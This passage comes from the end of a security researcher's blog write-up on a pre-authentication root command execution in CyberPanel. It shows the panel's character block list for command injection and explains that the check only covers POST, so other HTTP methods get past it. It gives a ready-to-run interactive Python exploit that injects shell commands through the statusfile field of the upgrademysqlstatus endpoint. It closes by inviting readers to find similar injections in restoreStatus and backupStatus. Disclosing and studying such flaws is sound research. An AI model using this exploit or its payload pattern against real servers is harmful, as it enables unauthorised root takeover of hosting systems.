                                    <span class="sh">"</span><span class="s">(</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> \
                                        <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"'"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">[</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span>
                                    <span class="sh">"</span><span class="s">]</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">{</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> \
                                        <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span>
                                    <span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">&amp;</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                                    <span class="n">logging</span><span class="p">.</span><span class="nf">writeToFile</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
                                    <span class="n">final_dic</span> <span class="o">=</span> <span class="p">{</span>
                                        <span class="sh">'</span><span class="s">error_message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">Data supplied is not accepted, following characters are not allowed in the input ` $ &amp; ( ) [ ] { } ; : ‘ &lt; &gt;.</span><span class="sh">"</span><span class="p">,</span>
                                        <span class="sh">"</span><span class="s">errorMessage</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Data supplied is not accepted, following characters are not allowed in the input ` $ &amp; ( ) [ ] { } ; : ‘ &lt; &gt;.</span><span class="sh">"</span><span class="p">}</span>
                                    <span class="n">final_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">final_dic</span><span class="p">)</span>
                                    <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="n">final_json</span><span class="p">)</span>
                        <span class="k">else</span><span class="p">:</span>
                            <span class="k">continue</span>

<span class="bp">...</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>

        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">X-XSS-Protection</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1; mode=block</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">X-Frame-Options</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">sameorigin</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Security-Policy</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">script-src </span><span class="sh">'</span><span class="s">self</span><span class="sh">'</span><span class="s"> https://www.jsdelivr.com</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Security-Policy</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">connect-src *;</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span>
            <span class="sh">'</span><span class="s">Content-Security-Policy</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">font-src </span><span class="sh">'</span><span class="s">self</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="s">unsafe-inline</span><span class="sh">'</span><span class="s"> https://www.jsdelivr.com https://fonts.googleapis.com</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span>
            <span class="sh">'</span><span class="s">Content-Security-Policy</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">style-src </span><span class="sh">'</span><span class="s">self</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="s">unsafe-inline</span><span class="sh">'</span><span class="s"> https://fonts.googleapis.com https://www.jsdelivr.com https://cdnjs.cloudflare.com https://maxcdn.bootstrapcdn.com https://cdn.jsdelivr.net</span><span class="sh">"</span>
        <span class="c1"># response['Content-Security-Policy'] = "default-src 'self' cyberpanel.cloud *.cyberpanel.cloud"
</span>        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">X-Content-Type-Options</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">nosniff</span><span class="sh">"</span>
        <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">Referrer-Policy</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">same-origin</span><span class="sh">"</span>
        <span class="k">return</span> <span class="n">response</span>
             
</code></pre></div></div>

<p>At this point I started fuzzing for all sorts of characters+tricks that will allow me to sneak in another command past this endpoint, though to no avail.</p>

<p>So as with our n-day, I started approaching this logically, where I found a funny bypass, which requires just a little bit of creativity and no actual knowledge about crazy linux shenanigans that can help you here.</p>

<p>If you take a look at the middleware, it does the command injection checks only if the request method is POST, however, if you look at our <code class="language-plaintext highlighter-rouge">upgrademysqlstatus()</code> route the POST data is loaded via <code class="language-plaintext highlighter-rouge">json.loads(request.body)</code>.</p>

<p>If we take a look at the <a href="https://docs.djangoproject.com/en/5.1/ref/request-response/">docs</a> for the <code class="language-plaintext highlighter-rouge">body</code> property in Django we can see the following:</p>

<blockquote>
  <p>The raw HTTP request body as a bytestring. This is useful for processing data in different ways than conventional HTML forms: binary images, XML payload etc. For processing conventional form data, use HttpRequest.POST.</p>
</blockquote>

<p>Can you notice the differential here? The body will be sent irregardless of the HTTP method/verb in question.</p>

<p>Which means, that we can just do an <code class="language-plaintext highlighter-rouge">OPTIONS</code>/<code class="language-plaintext highlighter-rouge">PUT</code>/<code class="language-plaintext highlighter-rouge">PATCH</code> and etc as the HTTP method and bypass the security middleware completely LOL?</p>

<p>Yup… we can:</p>

<p><img src="https://imgur.com/SBdzFOa.png" alt="Image" /></p>

<p>Easy pre-auth RCE with <strong>root</strong> privileges :D (which makes sense considering this project is used to manage all the services on the system).</p>

<h2 id="exploit">Exploit:</h2>

<p>I wrote a quick interactive exploit for the “0day” that you can use, enjoy!</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">httpx</span> 
<span class="kn">import</span> <span class="n">sys</span> 

<span class="k">def</span> <span class="nf">get_CSRF_token</span><span class="p">(</span><span class="n">client</span><span class="p">):</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="sh">'</span><span class="s">csrftoken</span><span class="sh">'</span><span class="p">]</span>
    
<span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">CSRF_token</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">X-CSRFToken</span><span class="sh">"</span><span class="p">:</span> <span class="n">CSRF_token</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">base_url</span><span class="p">)</span>
    <span class="p">}</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">statusfile</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">/dev/null; %s; #</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">csrftoken</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">CSRF_token</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="n">client</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">"</span><span class="s">/dataBases/upgrademysqlstatus</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">requestStatus</span><span class="sh">"</span><span class="p">]</span>
    
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">CSRF_token</span> <span class="o">=</span> <span class="nf">get_CSRF_token</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
    <span class="n">stdout</span> <span class="o">=</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">CSRF_token</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    
    <span class="n">client</span> <span class="o">=</span> <span class="n">httpx</span><span class="p">.</span><span class="nc">Client</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">$&gt; </span><span class="sh">"</span><span class="p">)</span>

        <span class="nf">exploit</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="https://i.imgur.com/JpQBBcC.png" alt="Image" /></p>

<p>You can also grab the files over at my <a href="https://github.com/DreyAnd/CyberPanel-RCE">Github</a>.</p>

<h3 id="challenge">Challenge:</h3>

<p>Hope you had a fun time reading this writeup :)</p>

<p>Since you’ve already came this far, I’m giving you a challenge to even find your own bug here:</p>

<ol>
  <li>
    <p>My friend found another variant of this exact bug, can you do it? (solvable)</p>
  </li>
  <li>
    <p>This one is more so if you want to find another 0day, check out the restoreStatus route:</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">restoreStatus</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">backupFile</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">backupFile</span><span class="sh">'</span><span class="p">].</span><span class="nf">strip</span><span class="p">(</span><span class="sh">"</span><span class="s">.tar.gz</span><span class="sh">"</span><span class="p">)</span>
    
        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">backup</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">backupFile</span><span class="sh">'</span><span class="p">])</span>
    
        <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
            <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">backup</span><span class="sh">"</span><span class="p">,</span> <span class="n">backupFile</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">backupFile</span><span class="sh">'</span><span class="p">]):</span>
            <span class="n">path</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">backupFile</span><span class="sh">'</span><span class="p">].</span><span class="nf">strip</span><span class="p">(</span><span class="sh">"</span><span class="s">.tar.gz</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">dir</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">dir</span><span class="sh">'</span><span class="p">]</span>
            <span class="n">path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/home/backup/transfer-</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nb">dir</span><span class="p">)</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">backupFile</span>
    
        <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">execPath</span> <span class="o">=</span> <span class="sh">"</span><span class="s">sudo cat </span><span class="sh">"</span> <span class="o">+</span> <span class="n">path</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/status</span><span class="sh">"</span>
                <span class="n">status</span> <span class="o">=</span> <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">outputExecutioner</span><span class="p">(</span><span class="n">execPath</span><span class="p">)</span>
</code></pre></div>    </div>

    <p>It seems like another straightforward command injection case - the issue here is that os.path.exists needs to return True, while the path would still somehow contain the command injection payload. We probably need an arbitrary file creation gadget. (Yes, I’m aware of the os.path.join trick in Python, and no, it does not help here.)</p>
  </li>
  <li>
    <p>There seems to be a similar case in backupStatus:</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">backupStatus</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">userID</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">backupDomain</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">websiteToBeBacked</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">,</span> <span class="n">backupDomain</span><span class="p">,</span> <span class="sh">"</span><span class="s">backup/status</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">backupFileNamePath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">,</span> <span class="n">backupDomain</span><span class="p">,</span> <span class="sh">"</span><span class="s">backup/backupFileName</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">,</span> <span class="n">backupDomain</span><span class="p">,</span> <span class="sh">"</span><span class="s">backup/pid</span><span class="sh">"</span><span class="p">)</span>
    
        <span class="n">domain</span> <span class="o">=</span> <span class="n">Websites</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">domain</span><span class="o">=</span><span class="n">backupDomain</span><span class="p">)</span>
    
        <span class="c1">## read file name
</span>        <span class="k">try</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">sudo cat </span><span class="sh">"</span> <span class="o">+</span> <span class="n">backupFileNamePath</span>
            <span class="n">fileName</span> <span class="o">=</span> <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">outputExecutioner</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">domain</span><span class="p">.</span><span class="n">externalApp</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">fileName</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">No such file or directory</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">final_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">'</span><span class="s">backupStatus</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">error_message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">None</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">abort</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">})</span>
                <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="n">final_json</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
</code></pre></div>    </div>

    <p>Though here the only issue is that we get our ORM exception if backupDomain doesn’t exist. Requires a website/filename creation bug again.</p>
  </li>
</ol>

<p>Good luck!</p>

  </div><div id="disqus_thread" style="margin-top:25px"></div>
  <script>
    var disqus_config = function () {
      this.page.url = '';
      this.page.identifier = '/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce.html';
    };
    (function () {
      var d = document, s = d.createElement('script');
      s.src = 'https://dreyand.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments
      powered by Disqus.</a></noscript></div>

    </section>
    <footer class="condensed">
      <ul class="social about-footer condensed"><a href="https://github.com/DreyAnd" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://twitter.com/dreyand_" target="_blank">
          <li>
            <i class="icon-twitter-squared"></i>
          </li>
        </a></ul><p class="about-footer condensed">&copy;
        2024</p><div class="about-footer condensed">
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" class="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
    </footer>
  </main>
  
  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
  
  <script src="/assets/js/simple-jekyll-search.min.js"></script>
  <script src="/assets/js/search.js"></script>
  
</body>

</html>
